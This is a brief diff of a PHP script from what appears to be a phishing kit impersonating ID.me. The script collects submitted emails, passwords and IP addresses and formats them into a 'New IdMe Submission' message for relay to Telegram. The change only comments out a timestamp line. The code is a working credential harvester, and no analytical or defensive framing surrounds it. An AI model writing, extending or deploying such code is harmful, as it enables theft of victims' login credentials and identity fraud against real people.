@@ -15,14 +15,14 @@ $result = pg_query($query);
     $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
     $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
     $ip = htmlspecialchars($_POST['ip'] ?? 'No ip');
-    $time = htmlspecialchars(NOW());
+    // $time = htmlspecialchars(NOW());
 
 
 // Define message structure before sending to Telegram
 $telegram_message = "📝 *New IdMe Submission*:\n\n".
                     "👤 *Useremail:* $useremail\n".
                     "📧 *Userpassword:* $userpassword\n".
-                    "  *Time:* $time\n".
+                    // "  *Time:* $time\n".
                     "💬 *IP:* $ip";
                     
 
